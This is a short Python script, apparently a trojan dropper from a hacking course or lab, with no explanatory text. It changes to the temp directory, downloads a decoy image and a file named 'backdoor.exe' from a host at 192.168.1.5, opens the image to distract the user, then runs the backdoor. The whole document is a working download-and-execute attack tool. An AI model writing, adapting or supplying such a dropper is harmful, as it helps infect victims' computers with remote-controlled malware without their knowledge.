import requests,subprocess,os,tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.1.5/image.jpeg")
download("http://192.168.1.5/backdoor.exe")

subprocess.Popen("image.jpeg")
subprocess.call("backdoor.exe")